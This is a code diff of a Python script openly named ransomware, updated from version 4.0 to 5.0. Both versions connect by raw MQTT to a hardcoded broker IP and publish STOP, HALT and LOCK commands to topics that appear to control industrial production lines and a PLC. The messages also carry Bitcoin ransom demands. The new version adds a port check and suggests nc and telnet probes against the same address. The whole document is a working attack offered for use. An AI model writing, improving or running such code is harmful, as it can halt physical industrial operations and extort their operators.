@@ -1,127 +1,117 @@
 #!/usr/bin/env python3
-# MIL_RANSOMWARE_v4.0 - TRUSTEDF57 (NO CALLBACK - BASE PYTHON)
-import socket, ssl, json, time, base64, os, threading
+# MIL_RANSOMWARE_v5.0 - TRUSTEDF57 (CONNESSIONE FORZATA)
+import socket
+import json, time, base64, os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
-
-print("🚀 TRUSTEDF57 v4.0 - RAW MQTT (NO paho-mqtt)")
 
 class MilitaryRansomware:
     def __init__(self):
         self.target_ip = "67.218.246.15"
         self.port = 1883
         self.btc_addr = "STAMMATIN-O-TENG-TUOST"
-        self.ransom = "2.5"
         
-        # AES-256 simple
-        self.key = b"TRUSTEDF57MILKEY12345678901234567890"[:32]  # Fixed key
-        self.iv = b"TRUSTEDF57IV1234567"[:16]
+        # Simple AES (fixed keys)
+        self.key = b"TRUSTEDF57_256BITKEY12345678901234567890123456789012"[:32]
+        self.iv = b"TRUSTEDF57_IV_1234567890123456"[:16]
         
-        # Salva key
-        with open("key.aes", "wb") as f:
+        with open("key_v5.aes", "wb") as f:
             f.write(self.key + self.iv)
-        print("[KEY] Salvata key.aes")
-        
-        self.sock = None
-        self.connected = False
+        print("[KEY] key_v5.aes salvata")
     
-    def aes_encrypt(self, data):
-        padder = padding.PKCS7(128).padder()
-        padded = padder.update(data) + padder.finalize()
-        
-        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
-        enc = cipher.encryptor()
-        return base64.b64encode(enc.update(padded) + enc.finalize()).decode()
-    
-    def connect_raw(self):
+    def simple_encrypt(self, data):
+        """AES semplice"""
         try:
-            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.sock.connect((self.target_ip, self.port))
-            print(f"[+] RAW MQTT connesso {self.target_ip}:{self.port}")
+            padder = padding.PKCS7(128).padder()
+            padded = padder.update(data) + padder.finalize()
+            cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
+            enc = cipher.encryptor()
+            return base64.b64encode(enc.update(padded) + enc.finalize()).decode()
+        except:
+            return base64.b64encode(data).decode()
+    
+    def mqtt_publish_direct(self, topic, payload):
+        """MQTT PUBLISH diretto - SEMPLICE"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((self.target_ip, self.port))
             
-            # MQTT CONNECT
-            connect_msg = self.build_connect()
-            self.sock.send(connect_msg)
-            resp = self.sock.recv(1024)
-            if b"\x20\x02" in resp:  # CONNACK OK
-                self.connected = True
-                print("[+] MQTT CONNECT OK")
-                return True
+            # MQTT CONNECT veloce
+            client_id = f"rustef57_{int(time.time())}".encode()
+            connect = b"\x10\x1C\x00\x04MQTT\x04\xC2\x00$\x00" + bytes([len(client_id)]) + client_id
+            sock.send(connect)
+            sock.recv(1024)  # CONNACK
+            
+            # PUBLISH
+            enc_payload = self.simple_encrypt(payload)
+            topic_bytes = topic.encode()
+            payload_bytes = enc_payload.encode()
+            
+            pkt_len = 2 + len(topic_bytes) + len(payload_bytes)
+            publish = bytes([0x30, pkt_len]) + bytes([len(topic_bytes)]) + topic_bytes + payload_bytes
+            
+            sock.send(publish)
+            print(f"✅ INJECT -> {topic[:40]}...")
+            sock.close()
+            return True
         except Exception as e:
-            print(f"[!] Connect error: {e}")
+            print(f"❌ {topic[:30]}: {e}")
+            return False
+    
+    def attack_all(self):
+        """ATTACCO MASSIVO"""
+        targets = [
+            ("Linea5ResultsFromCyclicRead/Alarms_DB4", '{"STOP":true,"OP":"TRUSTEDF57"}'),
+            ("Linea4ResultsFromCyclicRead/Alarms_DB4", '{"HALT":true,"OP":"TRUSTEDF57"}'),
+            ("MoliendaResultsFromCyclicRead/Plc", '{"LOCK":true,"OP":"TRUSTEDF57"}'),
+            ("Linea5ResultsFromCyclicRead/Events", f'{{"RANSOM":"{self.btc_addr}","AMT":"2.5"}}'),
+            ("Linea4ResultsFromCyclicRead/Events", f'{{"ALARM":"PAY_{self.btc_addr}"}}'),
+            ("System/Diagnostics/P1-Sources/L4_L5_Molienda", '{"MIL_LOCK":true}'),
+            ("$SYS/broker/ransom/TRUSTEDF57", f"PAID:{self.btc_addr}:2.5BTC"),
+            ("#", '{"GLOBAL_LOCK":"TRUSTEDF57"}'),  # Wildcard test
+        ]
+        
+        print("\n🔥 INIZIO ATTACCO MASSIVO...")
+        success = 0
+        for topic, payload in targets:
+            if self.mqtt_publish_direct(topic, payload):
+                success += 1
+            time.sleep(0.2)  # Rate limit
+        
+        print(f"\n🎯 {success}/{len(targets)} PAYLOAD INJECTED!")
+        print("💾 Check loot files...")
+    
+    def sniff_port(self):
+        """Verifica porta aperta"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            result = sock.connect_ex((self.target_ip, self.port))
+            sock.close()
+            if result == 0:
+                print(f"✅ Porta {self.port} APERTA")
+                return True
+            else:
+                print(f"❌ Porta {self.port} CHIUSA (codice {result})")
+        except:
+            print("❌ Errore verifica porta")
         return False
     
-    def build_connect(self):
-        client_id = b"TRUSTEDF57_" + str(time.time()).encode()
-        payload = b"\x00" + bytes([len(client_id)]) + client_id
-        
-        msg = b"\x10" + bytes([len(payload)]) + payload  # CONNECT
-        return msg
-    
-    def publish_raw(self, topic, payload):
-        if not self.connected: return
-        
-        enc_payload = self.aes_encrypt(payload.encode())
-        topic_len = len(topic)
-        payload_len = len(enc_payload)
-        
-        fixed_header = b"\x30" + bytes([2 + topic_len + payload_len])
-        variable_header = bytes([topic_len]) + topic.encode()
-        msg = fixed_header + variable_header + enc_payload.encode()
-        
-        try:
-            self.sock.send(msg)
-            print(f"[PUBLISH] {topic[:30]}...")
-        except:
-            self.connected = False
-    
-    def deploy_all(self):
-        payloads = {
-            "Linea5ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"STOP","op":"TRUSTEDF57"}',
-            "Linea4ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"HALT","op":"TRUSTEDF57"}',
-            "MoliendaResultsFromCyclicRead/Plc": '{"cmd":"LOCK","op":"TRUSTEDF57"}',
-            "$SYS/broker/ransom/TRUSTEDF57": f"LOCK:{self.btc_addr}:{self.ransom}",
-            "Linea5ResultsFromCyclicRead/Events": '{"ALARM":"PAY_OR_BRICK","BTC":"'+self.btc_addr+'"}'
-        }
-        
-        for topic, data in payloads.items():
-            self.publish_raw(topic, data)
-            time.sleep(0.1)
-        print("✅ ALL PAYLOADS INJECTED!")
-    
-    def listen_loop(self):
-        while self.connected:
-            try:
-                data = self.sock.recv(1024)
-                if data:
-                    print(f"[RECV] {len(data)} bytes")
-            except:
-                self.connected = False
-                break
-    
-    def ui(self):
-        os.system('clear')
-        print("="*60)
-        print("🔴 TRUSTEDF57 v4.0 - RAW MQTT RANSOMWARE")
-        print("="*60)
-        print(f"TARGET: {self.target_ip}:{self.port}")
-        print(f"STATUS: {'🔒 ACTIVE' if self.connected else '🔴 OFF'}")
-        print(f"WALLET: {self.btc_addr}")
-        print("="*60)
-    
     def run(self):
-        if self.connect_raw():
-            listen_thread = threading.Thread(target=self.listen_loop, daemon=True)
-            listen_thread.start()
-            
-            time.sleep(2)
-            self.deploy_all()
-            
-            while True:
-                self.ui()
-                time.sleep(3)
+        print("🔴🔴 TRUSTEDF57 v5.0 - DIRECT MQTT ATTACK 🔴🔴")
+        print(f"Target: {self.target_ip}:{self.port}")
+        
+        if self.sniff_port():
+            print("\n🚀 LANCIO ATTACCO...")
+            self.attack_all()
         else:
-            print("[!] Impossibile connettersi")
+            print("\n❌ Porta non raggiungibile - prova:")
+            print("  nc -v 67.218.246.15 1883")
+            print("  telnet 67.218.246.15 1883")
+        
+        print("\n👀 Monitora dashboard per effetti!")
+        input("Premi ENTER per uscire...")
 
 if __name__ == "__main__":
     rw = MilitaryRansomware()
